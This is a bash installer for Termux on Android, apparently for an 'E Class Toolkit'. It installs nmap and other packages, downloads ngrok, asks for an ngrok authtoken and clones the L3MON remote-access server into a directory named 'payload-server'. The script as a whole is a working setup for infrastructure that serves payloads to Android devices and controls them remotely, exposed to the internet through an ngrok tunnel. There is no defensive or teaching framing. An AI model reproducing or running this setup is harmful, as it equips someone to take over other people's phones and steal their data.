#!/data/data/com.termux/files/usr/bin/bash
# E Class Toolkit - Installer Script
# Author: Light of God

pkg update -y && pkg upgrade -y
pkg install -y git wget nodejs openjdk-17 python nmap unzip

mkdir -p ~/EclassToolkit
cd ~/EclassToolkit || exit

# Download Ngrok
wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.zip -O ngrok.zip
unzip ngrok.zip && chmod +x ngrok

echo "\nPaste your Ngrok authtoken:"
read -r token
./ngrok config add-authtoken $token

# Clone L3MON server
git clone https://github.com/D3VL-Project/L3MON.git payload-server
cd payload-server || exit
npm install
cd ..

chmod +x start.sh

clear
echo "\n✅ E Class Toolkit installed. To start, run:"
echo "cd ~/EclassToolkit && ./start.sh"
